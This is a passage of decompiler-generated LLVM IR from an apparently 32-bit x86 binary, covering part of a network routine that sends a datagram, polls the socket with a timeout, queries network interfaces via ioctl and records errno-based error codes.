  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i16, align 2
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80632a5 = load i32, i32* @ebp, align 4
  store i32 %v0_80632a5, i32* %stack_var_-4, align 4
  %v4_80632a5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 1000, i32* %edx.global-to-local, align 4
  store i32 %v4_80632a5, i32* @ebp, align 4
  %v0_80632ad = load i32, i32* @edi, align 4
  %v0_80632ae = load i32, i32* @esi, align 4
  %v0_80632af = load i32, i32* @ebx, align 4
  store i32 1000, i32* @ebx, align 4
  %v15_80632b2 = ptrtoint i32* %stack_var_-9036 to i32
  store i32 %tmp107, i32* %eax.global-to-local, align 4
  %v1_80632bb = add i32 %tmp107, 8
  %v2_80632bb = inttoptr i32 %v1_80632bb to i32*
  %v3_80632bb = load i32, i32* %v2_80632bb, align 4
  store i32 %v3_80632bb, i32* @esi, align 4
  %v1_80632be = add i32 %v3_80632bb, 32
  %v2_80632be = inttoptr i32 %v1_80632be to i32*
  %v3_80632be = load i32, i32* %v2_80632be, align 4
  store i32 %v3_80632be, i32* %eax.global-to-local, align 4
  %v2_80632c1 = add i32 %v3_80632bb, 28
  %v3_80632c1 = inttoptr i32 %v2_80632c1 to i32*
  %v4_80632c1 = load i32, i32* %v3_80632c1, align 4
  %v6_80632c1 = mul i32 %v4_80632c1, 1000
  %v1_80632c8 = ashr i32 %v3_80632be, 31
  %v2_80632c9 = zext i32 %v3_80632be to i64
  %v4_80632c9 = zext i32 %v1_80632c8 to i64
  %v5_80632c9 = mul nuw i64 %v4_80632c9, 4294967296
  %v6_80632c9 = or i64 %v5_80632c9, %v2_80632c9
  %v8_80632c9 = sdiv i64 %v6_80632c9, 1000
  %v9_80632c9 = trunc i64 %v8_80632c9 to i32
  store i32 %v9_80632c9, i32* %eax.global-to-local, align 4
  %v10_80632c9 = srem i64 %v6_80632c9, 1000
  %v11_80632c9 = trunc i64 %v10_80632c9 to i32
  store i32 %v11_80632c9, i32* %edx.global-to-local, align 4
  %v2_80632cb = add i32 %v9_80632c9, %v6_80632c1
  store i32 %v2_80632cb, i32* %ecx.global-to-local, align 4
  %v1_80632d3 = add i32 %v3_80632bb, 40
  %v2_80632d3 = inttoptr i32 %v1_80632d3 to i32*
  %v3_80632d3 = load i32, i32* %v2_80632d3, align 4
  %v13_80632d3 = icmp eq i32 %v3_80632d3, -1
  %v1_80632d7 = icmp eq i1 %v13_80632d3, false
  br i1 %v1_80632d7, label %dec_label_pc_8063310, label %dec_label_pc_80632d9

dec_label_pc_80632d9:                             ; preds = %entry
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8063322

dec_label_pc_80632ed:                             ; preds = %dec_label_pc_80633ef
  %v1_80632ed = call i32 @__errno_location(i32 %storemerge3)
  store i32 %v1_80632ed, i32* %eax.global-to-local, align 4
  %v1_80632f2 = inttoptr i32 %v1_80632ed to i32*
  %v2_80632f2 = load i32, i32* %v1_80632f2, align 4
  store i32 %v2_80632f2, i32* %eax.global-to-local, align 4
  %v0_80632f4 = load i32, i32* @esi, align 4
  %v1_80632f4 = add i32 %v0_80632f4, 44
  %v2_80632f4 = inttoptr i32 %v1_80632f4 to i32*
  store i32 3, i32* %v2_80632f4, align 4
  %v0_80632fb = load i32, i32* %eax.global-to-local, align 4
  %v1_80632fb = load i32, i32* @esi, align 4
  %v2_80632fb = add i32 %v1_80632fb, 48
  %v3_80632fb = inttoptr i32 %v2_80632fb to i32*
  store i32 %v0_80632fb, i32* %v3_80632fb, align 4
  store i32 3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80637f9

dec_label_pc_8063308:                             ; preds = %dec_label_pc_80636a7
  %v1_8063308 = add i32 %v0_8063308, 12
  %v2_8063308 = inttoptr i32 %v1_8063308 to i32*
  %v3_8063308 = load i32, i32* %v2_8063308, align 4
  store i32 %v3_8063308, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806370b

dec_label_pc_8063310:                             ; preds = %entry
  store i32 %v3_80632d3, i32* %ecx.global-to-local, align 4
  %v1_8063319 = add i32 %v3_80632bb, 36
  %v2_8063319 = inttoptr i32 %v1_8063319 to i32*
  %v3_8063319 = load i32, i32* %v2_8063319, align 4
  store i32 %v3_8063319, i32* @ebx, align 4
  br label %dec_label_pc_8063322

dec_label_pc_8063322:                             ; preds = %dec_label_pc_80632d9, %dec_label_pc_8063310
  %stack_var_-9000.0 = phi i32 [ %v3_80632d3, %dec_label_pc_8063310 ], [ %arg7, %dec_label_pc_80632d9 ]
  %storemerge3 = phi i32 [ %v3_8063319, %dec_label_pc_8063310 ], [ %arg6, %dec_label_pc_80632d9 ]
  %v4_806334a = icmp eq i32 %arg2, 0
  %v2_8063437 = ptrtoint i32* %stack_var_-168 to i32
  %v2_806346a = ptrtoint i32* %stack_var_-28 to i32
  %v4_806359d = and i8 %tmp84, 8
  %v5_806359d = icmp eq i8 %v4_806359d, 0
  %v2_80636c9 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80636cd = ptrtoint i32* %stack_var_-60 to i32
  %v2_80635d1 = ptrtoint i16* %stack_var_-76 to i32
  %v2_80635de = ptrtoint i32* %stack_var_-36 to i32
  %v2_80635f6 = ptrtoint i32* %stack_var_-8980 to i32
  %v4_8063647 = and i8 %tmp76, 32
  %v5_8063647 = icmp eq i8 %v4_8063647, 0
  %v2_8063674 = ptrtoint i32* %stack_var_-72 to i32
  %v4_8063684 = zext i16 %tmp75 to i32
  %v2_8063740 = ptrtoint i32* %stack_var_-100 to i32
  %v2_806374a = ptrtoint i32* %stack_var_-180 to i32
  %v2_80634a2 = ptrtoint i32* %stack_var_-44 to i32
  %v2_80634db = ptrtoint i32* %stack_var_-132 to i32
  %v4_8063503 = urem i8 %tmp85, 2
  %v5_8063503 = icmp eq i8 %v4_8063503, 0
  %v4_8063419 = icmp eq i32 %storemerge3, 0
  %v4_8063422 = icmp eq i32 %stack_var_-9000.0, 0
  %v2_806337b = ptrtoint i32* %stack_var_8 to i32
  %v1_8063420 = icmp eq i1 %v4_8063419, false
  br label %dec_label_pc_806334a

dec_label_pc_806334a:                             ; preds = %dec_label_pc_80637e4, %dec_label_pc_8063322
  %v1_806342f55 = phi i32 [ %v15_80632b2, %dec_label_pc_8063322 ], [ %v1_80637dd, %dec_label_pc_80637e4 ]
  %v0_806335d = phi i32 [ %v3_80632bb, %dec_label_pc_8063322 ], [ %v0_806334e.pre, %dec_label_pc_80637e4 ]
  %stack_var_-9016.0 = phi i32 [ %tmp86, %dec_label_pc_8063322 ], [ %stack_var_-9016.2, %dec_label_pc_80637e4 ]
  %stack_var_-9012.0 = phi i32 [ %tmp88, %dec_label_pc_8063322 ], [ %stack_var_-9012.2, %dec_label_pc_80637e4 ]
  %stack_var_-9004.0 = phi i32 [ 0, %dec_label_pc_8063322 ], [ %stack_var_-9004.2, %dec_label_pc_80637e4 ]
  %stack_var_-9008.0 = phi i32 [ 0, %dec_label_pc_8063322 ], [ %stack_var_-9008.2, %dec_label_pc_80637e4 ]
  %stack_var_-9020.0 = phi i32 [ 2, %dec_label_pc_8063322 ], [ %v4_80637e4, %dec_label_pc_80637e4 ]
  %stack_var_-9028.0 = phi i32 [ 0, %dec_label_pc_8063322 ], [ %stack_var_-9028.2, %dec_label_pc_80637e4 ]
  %v1_806334e = add i32 %v0_806335d, 56
  store i32 %v1_806334e, i32* %eax.global-to-local, align 4
  br i1 %v4_806334a, label %dec_label_pc_806342f, label %dec_label_pc_8063395

dec_label_pc_8063395:                             ; preds = %dec_label_pc_806334a
  %v2_806335d = inttoptr i32 %v1_806334e to i32*
  store i32 0, i32* %v2_806335d, align 4
  store i32 %v1_806334e, i32* %edx.global-to-local, align 4
  %v1_806336a = load i32, i32* @esp, align 4
  %v2_806336a = add i32 %v1_806336a, -4
  %v3_806336a = inttoptr i32 %v2_806336a to i32*
  store i32 %v2_806374a, i32* %v3_806336a, align 4
  %v2_806336b = add i32 %v1_806336a, -8
  %v3_806336b = inttoptr i32 %v2_806336b to i32*
  store i32 %v2_806374a, i32* %v3_806336b, align 4
  %v0_806336c = load i32, i32* %edx.global-to-local, align 4
  %v1_806336c = add i32 %v0_806336c, 4
  %v2_806336c = inttoptr i32 %v1_806336c to i32*
  %v3_806336c = load i32, i32* %v2_806336c, align 4
  store i32 %v3_806336c, i32* %eax.global-to-local, align 4
  %v0_806336f = load i32, i32* @esi, align 4
  %v1_806336f = add i32 %v0_806336f, 80
  %v2_806336f = inttoptr i32 %v1_806336f to i32*
  %v3_806336f = load i32, i32* %v2_806336f, align 4
  %v5_806336f = add i32 %v1_806336a, -12
  %v6_806336f = inttoptr i32 %v5_806336f to i32*
  store i32 %v3_806336f, i32* %v6_806336f, align 4
  %v0_8063372 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063372 = add i32 %v1_806336a, -16
  %v3_8063372 = inttoptr i32 %v2_8063372 to i32*
  store i32 %v0_8063372, i32* %v3_8063372, align 4
  %v1_8063373 = add i32 %v1_806336a, -20
  %v2_8063373 = inttoptr i32 %v1_8063373 to i32*
  store i32 134624118, i32* %v2_8063373, align 4
  %v3_8063373 = load i32, i32* %eax.global-to-local, align 4
  %v4_8063373 = add i32 %v3_8063373, 20
  %v5_8063373 = inttoptr i32 %v4_8063373 to i32*
  %v6_8063373 = load i32, i32* %v5_8063373, align 4
  call void @__pseudo_call(i32 %v6_8063373)
  %v0_8063376 = load i32, i32* @esi, align 4
  %v1_8063376 = add i32 %v0_8063376, 88
  %v2_8063376 = inttoptr i32 %v1_8063376 to i32*
  %v3_8063376 = load i32, i32* %v2_8063376, align 4
  store i32 %v3_8063376, i32* %eax.global-to-local, align 4
  %v1_8063379 = inttoptr i32 %v3_8063376 to i32*
  %v2_8063379 = load i32, i32* %v1_8063379, align 4
  %v3_8063379 = add i32 %v2_8063379, 1
  store i32 %v3_8063379, i32* %v1_8063379, align 4
  store i32 %v2_806337b, i32* %eax.global-to-local, align 4
  %v0_806337e = load i32, i32* @esp, align 4
  %v1_806337e = inttoptr i32 %v0_806337e to i32*
  %v3_806337e = add i32 %v0_806337e, 4
  store i32 %v1_806334e, i32* %ecx.global-to-local, align 4
  %v1_8063385 = inttoptr i32 %v3_806337e to i32*
  %v1_8063386 = add i32 %v0_806335d, 60
  %v2_8063386 = inttoptr i32 %v1_8063386 to i32*
  %v3_8063386 = load i32, i32* %v2_8063386, align 4
  store i32 %v3_8063386, i32* %edx.global-to-local, align 4
  store i32 %v2_806337b, i32* %v1_8063385, align 4
  %v0_806338a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_806338a, i32* %v1_806337e, align 4
  %v1_806338b = add i32 %v0_806337e, -4
  %v2_806338b = inttoptr i32 %v1_806338b to i32*
  store i32 134624142, i32* %v2_806338b, align 4
  %v3_806338b = load i32, i32* %edx.global-to-local, align 4
  %v4_806338b = add i32 %v3_806338b, 4
  %v5_806338b = inttoptr i32 %v4_806338b to i32*
  %v6_806338b = load i32, i32* %v5_806338b, align 4
  call void @__pseudo_call(i32 %v6_806338b)
  %v0_806338e = load i32, i32* @esp, align 4
  store i32 %tmp107, i32* @ebx, align 4
  %v2_8063398 = load i32, i32* %arg1, align 4
  store i32 %v2_8063398, i32* %eax.global-to-local, align 4
  %v0_806339a = load i32, i32* %edx.global-to-local, align 4
  %v2_806339a = add i32 %v0_806338e, 12
  %v3_806339a = inttoptr i32 %v2_806339a to i32*
  store i32 %v0_806339a, i32* %v3_806339a, align 4
  %v0_806339b = load i32, i32* %edx.global-to-local, align 4
  %v2_806339b = add i32 %v0_806338e, 8
  %v3_806339b = inttoptr i32 %v2_806339b to i32*
  store i32 %v0_806339b, i32* %v3_806339b, align 4
  %v1_806339c = add i32 %v2_8063398, 32
  %v2_806339c = inttoptr i32 %v1_806339c to i32*
  %v3_806339c = load i32, i32* %v2_806339c, align 4
  store i32 %v3_806339c, i32* %edx.global-to-local, align 4
  %v5_806339f = add i32 %v0_806338e, 4
  %v6_806339f = inttoptr i32 %v5_806339f to i32*
  store i32 %v1_806334e, i32* %v6_806339f, align 4
  %v3_80633a5 = inttoptr i32 %v0_806338e to i32*
  store i32 %v2_8063398, i32* %v3_80633a5, align 4
  %v1_80633a6 = add i32 %v0_806338e, -4
  %v2_80633a6 = inttoptr i32 %v1_80633a6 to i32*
  store i32 134624169, i32* %v2_80633a6, align 4
  %v3_80633a6 = load i32, i32* %edx.global-to-local, align 4
  %v4_80633a6 = add i32 %v3_80633a6, 4
  %v5_80633a6 = inttoptr i32 %v4_80633a6 to i32*
  %v6_80633a6 = load i32, i32* %v5_80633a6, align 4
  call void @__pseudo_call(i32 %v6_80633a6)
  %v0_80633a9 = load i32, i32* @esp, align 4
  %v1_80633ac = icmp eq i32 %v2_8063398, 0
  br i1 %v1_80633ac, label %dec_label_pc_80633c5, label %dec_label_pc_80633d6

dec_label_pc_80633c5:                             ; preds = %dec_label_pc_8063395
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_80633ca = load i32, i32* @esi, align 4
  %v1_80633ca = add i32 %v0_80633ca, 44
  %v2_80633ca = inttoptr i32 %v1_80633ca to i32*
  store i32 1, i32* %v2_80633ca, align 4
  br label %dec_label_pc_80637f9

dec_label_pc_80633d6:                             ; preds = %dec_label_pc_8063395
  %v2_80633b0 = add i32 %v0_80633a9, 12
  %v3_80633b0 = inttoptr i32 %v2_80633b0 to i32*
  store i32 %v2_8063398, i32* %v3_80633b0, align 4
  %v2_80633b1 = add i32 %v0_80633a9, 8
  %v3_80633b1 = inttoptr i32 %v2_80633b1 to i32*
  store i32 %v2_8063398, i32* %v3_80633b1, align 4
  %v5_80633b2 = add i32 %v0_80633a9, 4
  %v6_80633b2 = inttoptr i32 %v5_80633b2 to i32*
  store i32 %arg3, i32* %v6_80633b2, align 4
  %v6_80633b5 = inttoptr i32 %v0_80633a9 to i32*
  store i32 %v1_806334e, i32* %v6_80633b5, align 4
  %v1_80633bb = add i32 %v0_80633a9, -4
  %v2_80633bb = inttoptr i32 %v1_80633bb to i32*
  store i32 134624190, i32* %v2_80633bb, align 4
  call void @__pseudo_call(i32 %arg2)
  %v0_80633be = load i32, i32* @esp, align 4
  store i32 %v1_806334e, i32* %edx.global-to-local, align 4
  %v3_80633df = load i32, i32* %v2_8063386, align 4
  store i32 %v3_80633df, i32* %eax.global-to-local, align 4
  %v3_80633e2 = inttoptr i32 %v0_80633be to i32*
  store i32 %v1_806334e, i32* %v3_80633e2, align 4
  %v1_80633e3 = add i32 %v0_80633be, -4
  %v2_80633e3 = inttoptr i32 %v1_80633e3 to i32*
  store i32 134624230, i32* %v2_80633e3, align 4
  %v3_80633e3 = load i32, i32* %eax.global-to-local, align 4
  %v4_80633e3 = add i32 %v3_80633e3, 16
  %v5_80633e3 = inttoptr i32 %v4_80633e3 to i32*
  %v6_80633e3 = load i32, i32* %v5_80633e3, align 4
  call void @__pseudo_call(i32 %v6_80633e3)
  %v0_80633e6 = load i32, i32* @esp, align 4
  %v1_80633e6 = add i32 %v0_80633e6, 16
  %v0_80633e9 = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80633ef

dec_label_pc_80633ef:                             ; preds = %dec_label_pc_806356b, %dec_label_pc_8063557, %dec_label_pc_80633d6
  %v1_80633ef = phi i32 [ %v1_80634f8, %dec_label_pc_8063557 ], [ %v1_80634f8, %dec_label_pc_806356b ], [ %v1_80633e6, %dec_label_pc_80633d6 ]
  %stack_var_-9016.1 = phi i32 [ %stack_var_-9016.3155, %dec_label_pc_8063557 ], [ %stack_var_-9016.3155, %dec_label_pc_806356b ], [ %stack_var_-9016.0, %dec_label_pc_80633d6 ]
  %stack_var_-9012.1 = phi i32 [ %v0_8063493, %dec_label_pc_8063557 ], [ %v0_8063493, %dec_label_pc_806356b ], [ %stack_var_-9012.0, %dec_label_pc_80633d6 ]
  %stack_var_-9004.1 = phi i32 [ %stack_var_-9004.3.lcssa, %dec_label_pc_8063557 ], [ %stack_var_-9004.3.lcssa, %dec_label_pc_806356b ], [ %stack_var_-9004.0, %dec_label_pc_80633d6 ]
  %stack_var_-9008.1 = phi i32 [ %storemerge7.in.lcssa, %dec_label_pc_8063557 ], [ %storemerge7.in.lcssa, %dec_label_pc_806356b ], [ %stack_var_-9008.0, %dec_label_pc_80633d6 ]
  %stack_var_-9028.1 = phi i32 [ %stack_var_-9028.2, %dec_label_pc_8063557 ], [ %stack_var_-9028.2, %dec_label_pc_806356b ], [ %v0_80633e9, %dec_label_pc_80633d6 ]
  %v0_80633ef = load i32, i32* @edi, align 4
  %v2_80633ef = add i32 %v1_80633ef, -4
  %v3_80633ef = inttoptr i32 %v2_80633ef to i32*
  store i32 %v0_80633ef, i32* %v3_80633ef, align 4
  %v0_80633f0 = load i32, i32* @edi, align 4
  %v2_80633f0 = add i32 %v1_80633ef, -8
  %v3_80633f0 = inttoptr i32 %v2_80633f0 to i32*
  store i32 %v0_80633f0, i32* %v3_80633f0, align 4
  %v0_80633f1 = load i32, i32* @esi, align 4
  %v1_80633f1 = add i32 %v0_80633f1, 24
  %v2_80633f1 = inttoptr i32 %v1_80633f1 to i32*
  %v3_80633f1 = load i32, i32* %v2_80633f1, align 4
  %v5_80633f1 = add i32 %v1_80633ef, -12
  %v6_80633f1 = inttoptr i32 %v5_80633f1 to i32*
  store i32 %v3_80633f1, i32* %v6_80633f1, align 4
  %v0_80633f4 = load i32, i32* @esi, align 4
  %v1_80633f4 = add i32 %v0_80633f4, 8
  store i32 %v1_80633f4, i32* %eax.global-to-local, align 4
  %v2_80633f7 = add i32 %v1_80633ef, -16
  %v3_80633f7 = inttoptr i32 %v2_80633f7 to i32*
  store i32 %v1_80633f4, i32* %v3_80633f7, align 4
  %v1_80633f8 = add i32 %v1_80633ef, -20
  %v2_80633f8 = inttoptr i32 %v1_80633f8 to i32*
  store i32 0, i32* %v2_80633f8, align 4
  %v5_80633fa = add i32 %v1_80633ef, -24
  %v6_80633fa = inttoptr i32 %v5_80633fa to i32*
  store i32 %stack_var_-9028.1, i32* %v6_80633fa, align 4
  %v0_8063400 = load i32, i32* @esi, align 4
  %v1_8063400 = add i32 %v0_8063400, 88
  %v2_8063400 = inttoptr i32 %v1_8063400 to i32*
  %v3_8063400 = load i32, i32* %v2_8063400, align 4
  %v5_8063400 = add i32 %v1_80633ef, -28
  %v6_8063400 = inttoptr i32 %v5_8063400 to i32*
  store i32 %v3_8063400, i32* %v6_8063400, align 4
  %v0_8063403 = load i32, i32* @esi, align 4
  %v1_8063403 = inttoptr i32 %v0_8063403 to i32*
  %v2_8063403 = load i32, i32* %v1_8063403, align 4
  %v4_8063403 = add i32 %v1_80633ef, -32
  %v5_8063403 = inttoptr i32 %v4_8063403 to i32*
  store i32 %v2_8063403, i32* %v5_8063403, align 4
  %v6_8063405 = call i32 @__libc_sendto(i32 %stack_var_-9028.1, i32 %v2_80632cb, i32 %stack_var_-9020.0, i32 %stack_var_-9016.1, i32 %stack_var_-9012.1, i32 %stack_var_-9008.1)
  store i32 %v6_8063405, i32* %eax.global-to-local, align 4
  %v0_806340a = load i32, i32* @esp, align 4
  %v1_806340a = add i32 %v0_806340a, 32
  %v15_806340d = icmp eq i32 %v6_8063405, %stack_var_-9028.1
  %v1_8063413 = icmp eq i1 %v15_806340d, false
  br i1 %v1_8063413, label %dec_label_pc_80632ed, label %dec_label_pc_8063419

dec_label_pc_8063419:                             ; preds = %dec_label_pc_80633ef
  br i1 %v1_8063420, label %dec_label_pc_806342f, label %dec_label_pc_8063422

dec_label_pc_8063422:                             ; preds = %dec_label_pc_8063419
  br i1 %v4_8063422, label %dec_label_pc_8063422.dec_label_pc_806357d_crit_edge, label %dec_label_pc_806342f

dec_label_pc_8063422.dec_label_pc_806357d_crit_edge: ; preds = %dec_label_pc_8063422
  %v0_8063582.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806357d

dec_label_pc_806342f:                             ; preds = %dec_label_pc_8063422, %dec_label_pc_8063419, %dec_label_pc_806334a
  %v1_806342f = phi i32 [ %v1_806342f55, %dec_label_pc_806334a ], [ %v1_806340a, %dec_label_pc_8063419 ], [ %v1_806340a, %dec_label_pc_8063422 ]
  %stack_var_-9016.2 = phi i32 [ %stack_var_-9016.0, %dec_label_pc_806334a ], [ %stack_var_-9016.1, %dec_label_pc_8063419 ], [ %stack_var_-9016.1, %dec_label_pc_8063422 ]
  %stack_var_-9012.2 = phi i32 [ %stack_var_-9012.0, %dec_label_pc_806334a ], [ %stack_var_-9012.1, %dec_label_pc_8063419 ], [ %stack_var_-9012.1, %dec_label_pc_8063422 ]
  %stack_var_-9004.2 = phi i32 [ %stack_var_-9004.0, %dec_label_pc_806334a ], [ %stack_var_-9004.1, %dec_label_pc_8063419 ], [ %stack_var_-9004.1, %dec_label_pc_8063422 ]
  %stack_var_-9008.2 = phi i32 [ %stack_var_-9008.0, %dec_label_pc_806334a ], [ %stack_var_-9008.1, %dec_label_pc_8063419 ], [ %stack_var_-9008.1, %dec_label_pc_8063422 ]
  %stack_var_-9028.2 = phi i32 [ %stack_var_-9028.0, %dec_label_pc_806334a ], [ %stack_var_-9028.1, %dec_label_pc_8063419 ], [ %stack_var_-9028.1, %dec_label_pc_8063422 ]
  %v0_806342f = load i32, i32* @ebx, align 4
  %v2_806342f = add i32 %v1_806342f, -4
  %v3_806342f = inttoptr i32 %v2_806342f to i32*
  store i32 %v0_806342f, i32* %v3_806342f, align 4
  %v1_8063430 = add i32 %v1_806342f, -8
  %v2_8063430 = inttoptr i32 %v1_8063430 to i32*
  store i32 12, i32* %v2_8063430, align 4
  %v1_8063432 = add i32 %v1_806342f, -12
  %v2_8063432 = inttoptr i32 %v1_8063432 to i32*
  store i32 ptrtoint (i32* @global_var_807f800.744 to i32), i32* %v2_8063432, align 4
  store i32 %v2_8063437, i32* %eax.global-to-local, align 4
  %v2_806343d = add i32 %v1_806342f, -16
  %v3_806343d = inttoptr i32 %v2_806343d to i32*
  store i32 %v2_8063437, i32* %v3_806343d, align 4
  %v3_806343e = inttoptr i32 %stack_var_-9028.2 to i16*
  %v4_806343e = call i32 @memcpy(i16* %v3_806343e, i32 %v2_80632cb, i32 %stack_var_-9020.0)
  store i32 %v4_806343e, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %ecx.global-to-local, align 4
  %v0_8063446 = load i32, i32* @esp, align 4
  %v1_8063446 = add i32 %v0_8063446, 16
  store i32 %arg4, i32* @ebx, align 4
  %v0_8063458 = load i32, i32* @esi, align 4
  %v1_8063458 = inttoptr i32 %v0_8063458 to i32*
  %v2_8063458 = load i32, i32* %v1_8063458, align 4
  store i32 %v2_8063458, i32* %eax.global-to-local, align 4
  store i32 %v2_8063458, i32* %stack_var_-28, align 4
  %v1_80635c7 = add i32 %stack_var_-9028.2, 286
  %v1_80635cc = and i32 %v1_80635c7, -16
  br label %dec_label_pc_8063463

dec_label_pc_8063463:                             ; preds = %dec_label_pc_806371f, %dec_label_pc_806372e, %dec_label_pc_8063705.dec_label_pc_8063463.backedge_crit_edge, %dec_label_pc_806342f
  %v1_8063463 = phi i32 [ %v1_8063446, %dec_label_pc_806342f ], [ %v1_8063463.pre.pre, %dec_label_pc_8063705.dec_label_pc_8063463.backedge_crit_edge ], [ %v1_80636e8, %dec_label_pc_806372e ], [ %v1_80636e8, %dec_label_pc_806371f ]
  %v0_8063463 = phi i32 [ %arg5, %dec_label_pc_806342f ], [ %v0_8063463.pre.pre, %dec_label_pc_8063705.dec_label_pc_8063463.backedge_crit_edge ], [ %v6_80636e3, %dec_label_pc_806372e ], [ %v6_80636e3, %dec_label_pc_806371f ]
  %v2_8063463 = add i32 %v1_8063463, -4
  %v3_8063463 = inttoptr i32 %v2_8063463 to i32*
  store i32 %v0_8063463, i32* %v3_8063463, align 4
  %v5_8063464 = add i32 %v1_8063463, -8
  %v6_8063464 = inttoptr i32 %v5_8063464 to i32*
  store i32 %v2_80632cb, i32* %v6_8063464, align 4
  store i32 %v2_806346a, i32* %eax.global-to-local, align 4
  %v1_806346d = add i32 %v1_8063463, -12
  %v2_806346d = inttoptr i32 %v1_806346d to i32*
  store i32 1, i32* %v2_806346d, align 4
  %v2_806346f = add i32 %v1_8063463, -16
  %v3_806346f = inttoptr i32 %v2_806346f to i32*
  store i32 %v2_806346a, i32* %v3_806346f, align 4
  %v0_8063470 = load i32, i32* %stack_var_-28, align 4
  %v2_8063470 = load i32, i32* %stack_var_-20, align 4
  %v4_8063470 = inttoptr i32 %v0_8063470 to %pollfd*
  %v5_8063470 = call i32 @__libc_poll(%pollfd* %v4_8063470, i32 1, i32 %v2_8063470)
  store i32 %v5_8063470, i32* %eax.global-to-local, align 4
  %v0_8063475 = load i32, i32* @esp, align 4
  %v1_8063475 = add i32 %v0_8063475, 16
  %v10_8063478 = icmp eq i32 %v5_8063470, -1
  br i1 %v10_8063478, label %dec_label_pc_806358e, label %dec_label_pc_8063481

dec_label_pc_8063481:                             ; preds = %dec_label_pc_8063463
  %v1_8063481 = icmp eq i32 %v5_8063470, 0
  %v1_8063483 = icmp eq i1 %v1_8063481, false
  br i1 %v1_8063483, label %dec_label_pc_806359d, label %dec_label_pc_8063489

dec_label_pc_8063489:                             ; preds = %dec_label_pc_8063481
  %v0_8063489 = load i32, i32* @esi, align 4
  %v1_8063489 = inttoptr i32 %v0_8063489 to i32*
  %v2_8063489 = load i32, i32* %v1_8063489, align 4
  store i32 %v2_8063489, i32* %eax.global-to-local, align 4
  %v0_806348b = load i32, i32* @edx, align 4
  %v2_806348b = add i32 %v0_8063475, 12
  %v3_806348b = inttoptr i32 %v2_806348b to i32*
  store i32 %v0_806348b, i32* %v3_806348b, align 4
  store i32 8800, i32* %stack_var_-44, align 4
  %v0_8063493 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_80634a2, i32* %eax.global-to-local, align 4
  %v2_80634a5 = add i32 %v0_8063475, 8
  %v3_80634a5 = inttoptr i32 %v2_80634a5 to i32*
  store i32 %v2_80634a2, i32* %v3_80634a5, align 4
  %v1_80634a6 = add i32 %v0_8063475, 4
  %v2_80634a6 = inttoptr i32 %v1_80634a6 to i32*
  store i32 35090, i32* %v2_80634a6, align 4
  %v6_80634ab = inttoptr i32 %v0_8063475 to i32*
  store i32 %v0_8063493, i32* %v6_80634ab, align 4
  %v3_80634b1 = call i32 @ioctl(i32 %v0_8063493, i32 %stack_var_-9008.2, i32 %stack_var_-9004.2)
  store i32 %v3_80634b1, i32* %eax.global-to-local, align 4
  %v1_80634b9 = icmp eq i32 %v3_80634b1, 0
  %v1_80634bb = icmp eq i1 %v1_80634b9, false
  br i1 %v1_80634bb, label %dec_label_pc_806370e, label %dec_label_pc_80634c1

dec_label_pc_80634c1:                             ; preds = %dec_label_pc_8063489
  %v0_80634b6 = load i32, i32* @esp, align 4
  %v1_80634b6 = add i32 %v0_80634b6, 16
  %v3_80634c1 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80635f6, i32* %edx.global-to-local, align 4
  %v2_80634c7 = udiv i32 %v3_80634c1, 32
  %tmp192 = icmp ult i32 %v3_80634c1, 32
  store i32 %v2_80634c7, i32* @edi, align 4
  %tmp128152 = icmp eq i1 %tmp192, false
  br i1 %tmp128152, label %dec_label_pc_80634d2, label %dec_label_pc_806370e

dec_label_pc_80634d2:                             ; preds = %dec_label_pc_80634c1, %dec_label_pc_8063516
  %stack_var_-9016.3155 = phi i32 [ %v4_8063516, %dec_label_pc_8063516 ], [ %v2_80635f6, %dec_label_pc_80634c1 ]
  %v0_80634d2154 = phi i32 [ %v3_80634f3, %dec_label_pc_8063516 ], [ %v3_80634b1, %dec_label_pc_80634c1 ]
  %v1_80634d2153 = phi i32 [ %v1_80634f8, %dec_label_pc_8063516 ], [ %v1_80634b6, %dec_label_pc_80634c1 ]
  %v2_80634d2 = add i32 %v1_80634d2153, -4
  %v3_80634d2 = inttoptr i32 %v2_80634d2 to i32*
  store i32 %v0_80634d2154, i32* %v3_80634d2, align 4
  %v1_80634d3 = add i32 %v1_80634d2153, -8
  %v2_80634d3 = inttoptr i32 %v1_80634d3 to i32*
  store i32 32, i32* %v2_80634d3, align 4
  %v5_80634d5 = add i32 %v1_80634d2153, -12
  %v6_80634d5 = inttoptr i32 %v5_80634d5 to i32*
  store i32 %stack_var_-9016.3155, i32* %v6_80634d5, align 4
  store i32 %v2_80634db, i32* @ebx, align 4
  %v2_80634de = add i32 %v1_80634d2153, -16
  %v3_80634de = inttoptr i32 %v2_80634de to i32*
  store i32 %v2_80634db, i32* %v3_80634de, align 4
  %v3_80634df = inttoptr i32 %stack_var_-9016.3155 to i16*
  %v4_80634df = call i32 @memcpy(i16* %v3_80634df, i32 %v0_8063493, i32 %stack_var_-9008.2)
  store i32 %v4_80634df, i32* %eax.global-to-local, align 4
  %v0_80634e4 = load i32, i32* @esp, align 4
  %v2_80634e7 = add i32 %v0_80634e4, 8
  %v3_80634e7 = inttoptr i32 %v2_80634e7 to i32*
  store i32 %v2_80634db, i32* %v3_80634e7, align 4
  %v1_80634e8 = add i32 %v0_80634e4, 4
  %v2_80634e8 = inttoptr i32 %v1_80634e8 to i32*
  store i32 35091, i32* %v2_80634e8, align 4
  %v6_80634ed = inttoptr i32 %v0_80634e4 to i32*
  store i32 %v0_8063493, i32* %v6_80634ed, align 4
